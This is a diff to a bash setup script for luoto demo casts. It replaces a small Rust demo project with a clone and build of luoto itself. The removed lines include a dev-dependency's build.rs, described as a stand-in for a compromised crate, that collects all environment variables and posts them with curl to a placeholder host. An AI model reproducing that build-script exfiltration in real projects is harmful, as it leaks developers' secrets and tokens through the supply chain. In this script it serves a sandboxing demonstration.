@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Run, out of sight, at the start of a cast: ~/demo with four small repos, and the canned model
+# Run, out of sight, at the start of a cast: ~/demo with three small repos and a clone of luoto, and the canned model
 # server (canned.py). `just casts` stops the server and removes the env and the folder afterwards.
 # The folder holds a marker, .luoto-cast (the server's pid): one without it is never touched.
 set -eu
@@ -62,93 +62,19 @@ mkdir -p "$CAST/tz" && cd "$CAST/tz"
 printf '# tz\n' >README.md
 commit
 
-# A small CLI in Rust, on the toolchain its rust-toolchain.toml pins, that so far has only its
-# splash screen (src/splash.rs), a plain one. Its dev-dependency, testkit, stands in for a
-# compromised crate: its build script posts the environment to a host of its own. Only tests
-# build it, only in a luoto sandbox does it act, and its host has no address.
-mkdir -p "$CAST/pulse/src" "$CAST/pulse/tests" "$CAST/pulse/testkit/src" && cd "$CAST/pulse"
-printf '# pulse\n' >README.md
-printf '/target\n' >.gitignore
-printf '[toolchain]\nchannel = "1.98.1"\n' >rust-toolchain.toml
-cat >Cargo.toml <<'TOML'
-[package]
-name = "pulse"
-version = "0.1.0"
-edition = "2024"
-
-[dev-dependencies]
-testkit = { path = "testkit" }
-TOML
-cat >src/main.rs <<'RS'
-use std::io::{IsTerminal, stdout};
-
-fn main() -> std::io::Result<()> {
-    pulse::splash::show(&mut stdout(), stdout().is_terminal())
-}
-RS
-printf 'pub mod splash;\n' >src/lib.rs
-cat >src/splash.rs <<'RS'
-use std::io::{self, Write};
-
-/// The splash screen; `tty` says whether `out` is a terminal.
-pub fn show(out: &mut impl Write, _tty: bool) -> io::Result<()> {
-    writeln!(out, "pulse")?;
-    writeln!(out, "response times at a glance")
-}
-RS
-cat >tests/splash.rs <<'RS'
-use pulse::splash;
-
-fn shown() -> String {
-    let mut out = Vec::new();
-    splash::show(&mut out, false).unwrap();
-    String::from_utf8(out).unwrap()
-}
-
-#[test]
-fn names_the_tool() {
-    assert!(shown().contains("pulse"));
-}
-
-#[test]
-fn says_what_it_is_for() {
-    assert!(shown().contains("response times at a glance"));
-}
-RS
-cat >testkit/Cargo.toml <<'TOML'
-[package]
-name = "testkit"
-version = "0.1.0"
-edition = "2024"
-TOML
-: >testkit/src/lib.rs
-cat >testkit/build.rs <<'RS'
-use std::io::Write;
-use std::path::Path;
-use std::process::{Command, Stdio};
-
-fn main() {
-    if !Path::new("/opt/luoto").exists() {
-        return;
-    }
-    let env: String = std::env::vars().map(|(k, v)| format!("{k}={v}\n")).collect();
-    let curl = Command::new("curl")
-        .args(["-s", "-m", "5", "-o", "/dev/null", "--data-binary", "@-"])
-        .arg("https://collect.example.net/env")
-        .stdin(Stdio::piped())
-        .spawn();
-    if let Ok(mut curl) = curl {
-        if let Some(mut stdin) = curl.stdin.take() {
-            let _ = stdin.write_all(env.as_bytes());
-        }
-        let _ = curl.wait();
-    }
-}
-RS
-# The lock file and the first build, so neither shows as the env's change or the cast's wait.
-cargo generate-lockfile --quiet --offline
-cargo build --quiet --offline
-commit
+# luoto itself as it is before a change the hello cast makes: branch $LUOTO_CAST_BASE (main) of
+# the checkout these casts are in, at the checkout's version (a vault one version made is
+# recreated by another, and the cast ends on a `luoto setup` of this clone). Built here, into a
+# target folder of the casts' own, so the cast's last build is only what the change touched.
+repo=$(cd "$here/../.." && pwd)
+git clone -q --branch "${LUOTO_CAST_BASE:-main}" "$repo" "$CAST/luoto"
+cd "$CAST/luoto"
+git remote remove origin
+cp "$repo/Cargo.toml" "$repo/Cargo.lock" .
+git -c user.name=cast -c user.email=cast@example.com commit -qam version || true
+# The UI's bundle is built, not committed, and the binary embeds its folder.
+mkdir -p frontend/dist
+CARGO_TARGET_DIR="${LUOTO_CAST_TARGET:?where the casts build}" cargo build --quiet -p luoto
 
 nohup python3 -I "$here/canned.py" 18000 >/dev/null 2>&1 &
 echo $! >"$CAST/.luoto-cast"
